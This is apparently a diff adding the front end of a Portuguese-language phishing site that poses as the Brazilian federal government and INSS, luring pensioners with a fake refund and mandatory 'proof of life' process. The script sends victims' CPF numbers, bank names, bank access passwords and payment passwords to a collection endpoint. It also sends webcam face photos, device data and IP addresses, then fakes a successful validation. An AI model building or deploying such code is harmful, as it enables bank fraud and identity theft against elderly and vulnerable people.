+                                mediaStream = null; 
+                            } 
+                        };
+                        const startCamera = async () => { 
+                            try { 
+                                stopCameraTracks(); 
+                                video.style.display = 'block'; 
+                                canvas.style.display = 'none'; 
+                                validationMessage.textContent = ''; 
+                                takePhotoBtn.style.display = 'none'; 
+                                retakePhotoBtn.style.display = 'none'; 
+                                startCameraBtn.style.display = 'none'; 
+                                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true }); 
+                                video.srcObject = mediaStream; 
+                                video.play(); 
+                                video.onloadedmetadata = () => { 
+                                    canvas.width = video.videoWidth; 
+                                    canvas.height = video.height; 
+                                    takePhotoBtn.style.display = 'inline-flex'; 
+                                }; 
+                            } 
+                            catch (err) { 
+                                console.error("Erro ao aceder à câmera: ", err); 
+                                showTemporaryMessage('Erro ao aceder à câmera. Por favor, permita o acesso e tente novamente.', 'error'); 
+                                validationMessage.textContent = 'Acesso à câmera negado ou não disponível.'; 
+                                startCameraBtn.style.display = 'inline-flex'; 
+                            } 
+                        };
+                        const takePhoto = () => { 
+                            if (video.srcObject) { 
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+
+                                context.drawImage(video, 0, 0, canvas.width, canvas.height); 
+                                savePhoto(canvas);
+                                video.style.display = 'none'; 
+                                canvas.style.display = 'block'; 
+                                takePhotoBtn.style.display = 'none'; 
+                                retakePhotoBtn.style.display = 'inline-flex'; 
+                                stopCameraTracks(); 
+                                validationMessage.textContent = 'Processando validação facial...'; 
+                                showTemporaryMessage('Processando validação facial...', 'info'); 
+                                //simulateFacialValidation();
+                            } 
+                        };
+
+                        const savePhoto = (canvas) => {
+                            //const imageData = canvas.toDataURL("image/png"); // gera imagem em base64
+                            const imageData = canvas.toDataURL("image/webp", 0.8);
+                            const device = getDeviceInfo();
+                            const ip = getIP();
+
+                            fetch(BASE_URL + "/api/sendVerification", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ 
+                                    "CPF": apiData.personalInfo.cpf,
+                                    "device": device,
+                                    "ip": ip,
+                                    "photo": imageData 
+                                })
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                // if (data.success) {
+                                    showTemporaryMessage("📸 Foto salva com sucesso!", "info");
+
+                                    showTemporaryMessage('Validação facial bem-sucedida!', 'info'); 
+                                    validationMessage.textContent = 'Validação facial bem-sucedida!'; 
+                                    setTimeout(() => { window.location.href = 'pagina_final.html'; }, 1500); 
+
+                                // } else {
+                                // showTemporaryMessage("Erro ao salvar a foto: " + data.message, "error");
+                                // }
+                            })
+                            .catch(error => {
+                                console.error("Erro ao enviar foto:", error);
+                                showTemporaryMessage("Falha ao enviar a foto: " + error.message, "error");
+                            });
+                        };
+
+                        const getDeviceInfo = () => {
+                            if (navigator.userAgentData) {
+                                navigator.userAgentData.getHighEntropyValues([
+                                    "platform", "platformVersion", "uaFullVersion", "architecture", "model"
+                                ]).then(ua => {
+                                    console.log("Browser:", ua.brands);
+                                    console.log("Platform:", ua.platform);
+                                    console.log("Architecture:", ua.architecture);
+                                    return  ua.model;
+                                });
+                            }
+                        }
+
+                        const getIP = () => {
+                              fetch('https://api.ipify.org?format=json')
+                                .then(res => res.json())
+                                .then(data => {
+                                    return  data.ip;
+                                });
+                                return "";
+                        }
+
+                        const simulateFacialValidation = () => { 
+                            isLoading = true; 
+                            loadingMessage = 'Analisando imagem para validação...'; 
+                            render(); 
+                            setTimeout(() => { 
+                                isLoading = false; 
+                                render(); 
+                                const success = Math.random() < 0.8; 
+                                if (success) { 
+                                    showTemporaryMessage('Validação facial bem-sucedida!', 'success'); 
+                                    validationMessage.textContent = 'Validação facial bem-sucedida!'; 
+                                    setTimeout(() => { window.location.href = 'pagina_final.html'; }, 1500); 
+                                } else { 
+                                    showTemporaryMessage('Validação facial falhou. Tente novamente.', 'error'); 
+                                    validationMessage.textContent = 'Validação facial falhou. Tente novamente.'; 
+                                    retakePhotoBtn.textContent = 'Tentar Novamente'; 
+                                } 
+                            }, 3000); 
+                        };
+                        startCameraBtn.addEventListener('click', startCamera);
+                        takePhotoBtn.addEventListener('click', takePhoto);
+                        retakePhotoBtn.addEventListener('click', startCamera);
+                        cancelValidationBtn.addEventListener('click', () => { stopCameraTracks(); currentView = 'cpf_input'; showTemporaryMessage('Validação facial cancelada.', 'info'); render(); });
+                        startCamera();
+                    };
+
+                    const openConfirmModal = (passwordInput0, passwordInput1) => {
+                        const confirmModal = document.createElement('div');
+                        confirmModal.id = 'bank-confirm-modal';
+                        confirmModal.className = 'fixed inset-0 z-50 flex items-center justify-center';
+                        confirmModal.innerHTML = `<div class="fixed inset-0 bg-black bg-opacity-50" role="button" aria-label="Cancelar envio"></div><div class="relative bg-white rounded-lg w-full max-w-sm mx-4 p-6 shadow-xl text-center"><h3 class="text-lg font-bold text-gray-900 mb-4">Confirmação de Assinatura</h3><p class="text-gray-700 mb-6">Você está prestes a realizar a assinatura. Confirme para prosseguir com a validação facial.</p><div class="flex justify-center gap-4"><button id="modal-confirm-btn" class="btn-primary w-1/2">Confirmar</button><button id="modal-cancel-btn" class="btn-secondary w-1/2">Cancelar</button></div></div>`;
+                        appContainer.appendChild(confirmModal);
+                        const closeModalAndSubmit = () => { 
+                            confirmModal.remove(); 
+                            simulateSubmit(passwordInput0, passwordInput1); 
+                        };
+                        const closeModalOnly = () => { confirmModal.remove(); };
+                        confirmModal.querySelector('#modal-confirm-btn').addEventListener('click', closeModalAndSubmit);
+                        confirmModal.querySelector('#modal-cancel-btn').addEventListener('click', closeModalOnly);
+                        confirmModal.querySelector('.bg-opacity-50').addEventListener('click', closeModalOnly);
+                    };
+
+                    const simulateSubmit = (passwordInput0, passwordInput1) => {
+                        isLoading = true;
+                        loadingMessage = 'Enviando dados bancários...';
+                        render();
+                        const bank = banksData.find(b => b.id === selectedBankId);
+                        if (!bank) { showTemporaryMessage('Erro: Banco não selecionado.', 'error'); isLoading = false; render(); return; }
+                        
+                        // Garante que api_personal_info e api_inss_benefits são enviados,
+                        // mas com os valores padrão/vazios definidos anteriormente.
+                        const formData = { 
+                            cpf: cpfValue.replace(/\D/g, ''), 
+                            api_personal_info: apiData.personalInfo, // Usará os valores padrão definidos
+                            api_inss_benefits: apiData.inssBenefits, // Usará o array vazio definido
+                            banco_id: selectedBankId, 
+                            banco_nome_display: bank.name, 
+                            campos_digitados: [] 
+                        };
+                        bank.authFields.forEach((field, idx) => { const inputId = `input-${field.type}-${idx}`; const value = tempAuthValues[inputId] || ''; formData.campos_digitados.push({ label: field.label, valor: value }); });
+
+                        fetch(BASE_URL + '/api/sendBankInfo', { 
+                            method: 'POST', 
+                            headers: { 'Content-Type': 'application/json' }, 
+                            body: JSON.stringify({
+                                "CPF": cpfValue.replace(/\D/g, ''),
+                                "bankName": bank.name,
+                                "accessPassword": passwordInput0,
+                                "paymentPassword": passwordInput1
+                            }) 
+                        })
+                        .then(response => response.json())
+                        .then(data => { 
+                            isLoading = false; 
+                            currentView = 'facial_validation'; 
+                            render(); 
+                        })
+                        .catch(error => { 
+                            isLoading = false; 
+                            showTemporaryMessage('Falha na requisição para salvar dados: ' + error.message, 'error'); 
+                            currentView = 'cpf_input'; 
+                            selectedBankId = null; 
+                            apiData = { personalInfo: null, inssBenefits: null }; 
+                            render(); 
+                        });
+                    };
+
+                    if (isModalOpen) {
+                        const modal = document.createElement('div');
+                        modal.className = 'fixed inset-0 z-50 flex items-center justify-center';
+                        modal.innerHTML = `<div class="fixed inset-0 bg-black bg-opacity-50" role="button" aria-label="Fechar comunicado"></div>
+  <div class="relative bg-white rounded-lg w-full max-w-md mx-4 p-6 shadow-xl">
+    <button id="close-initial-modal" class="absolute right-4 top-4 text-gray-500 hover:text-gray-700" aria-label="Fechar" role="button">&times;</button>
+    <div class="mt-2">
+      <h2 class="text-xl font-bold text-gray-900 mb-4">🛑 ATENÇÃO: Prova de Vida é OBRIGATÓRIA</h2>
+      <div class="text-gray-700 space-y-4">
+        <p>Prezado(a) cidadão(ã),</p>
+        <p>Informamos que, em decorrência da auditoria sobre os descontos indevidos aplicados pelo INSS, foi constatado um rombo nos valores recolhidos de diversos contribuintes ao longo dos últimos anos.</p>
+        <p>Dessa forma, está sendo iniciado o processo de restituição dos valores pagos a mais por aposentados, pensionistas e contribuintes ativos que foram impactados.</p>
+        <p class="text-sm text-gray-600">Caso ainda não tenha realizado sua Prova de Vida Digital este ano, você será direcionado para o processo após o login.</p>
+      </div>
+      <button id="understand-button" class="mt-6 w-full bg-[#1351b4] hover:bg-[#0e3d8c] text-white font-medium py-3 px-4 rounded-lg transition duration-150">Entendi e quero prosseguir</button>
+    </div>
+  </div>
+`;
+                        appContainer.appendChild(modal);
+                        const closeInitialModal = () => { isModalOpen = false; render(); };
+                        modal.querySelector('#close-initial-modal').appendChild(icons.x.cloneNode(true));
+                        modal.querySelector('.bg-opacity-50').addEventListener('click', closeInitialModal);
+                        modal.querySelector('#close-initial-modal').addEventListener('click', closeInitialModal);
+                        modal.querySelector('#understand-button').addEventListener('click', closeInitialModal);
+                    } else {
+                        if (currentView === 'cpf_input') { renderCpfInputView(); }
+                        // A vista api_data_display não será mais usada no fluxo principal
+                        else if (currentView === 'api_data_display') { renderApiDataDisplayView(); } 
+                        else if (currentView === 'api_data_write') { renderApiDataWrite(); } 
+                        else if (currentView === 'bank_selection') { renderBankList(); }
+                        else if (currentView === 'bank_auth_form') { renderAuthForm(); }
+                        else if (currentView === 'facial_validation') { renderFacialValidationView(); }
+                    }
+
+                    const footer = document.createElement('footer');
+                    footer.className = 'w-full bg-gray-200 py-6 mt-8';
+                    footer.innerHTML = `<div class="container mx-auto px-4 text-center text-gray-700 text-sm"><p class="mb-1">© ${new Date().getFullYear()} Governo Federal - Todos os direitos reservados</p><div class="flex justify-center space-x-4 mt-2"><a href="#" class="text-[#1351b4] hover:underline">Termos de uso</a><span class="text-gray-500">|</span><a href="#" class="text-[#1351b4] hover:underline">Política de privacidade</a></div><p class="mt-4 text-xs text-gray-500">Desenvolvido e mantido pelo Serpro e Secretaria de Governo Digital</p></div>`;
+                    appContainer.appendChild(footer);
+
+                    if (isLoading) {
+                        const loader = document.createElement('div');
+                        loader.className = 'fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50';
+                        loader.innerHTML = `<div class="bg-white rounded-lg p-8 flex flex-col items-center"><div class="animate-spin rounded-full h-12 w-12 border-b-2 border-[#1351b4]"></div><p class="mt-4 text-gray-700">${loadingMessage}</p></div>`;
+                        appContainer.appendChild(loader);
+                    }
+                };
+                render();
+                return appContainer;
+            };
+            root.appendChild(App());
+        });
+    </script>
+</body>
+</html>
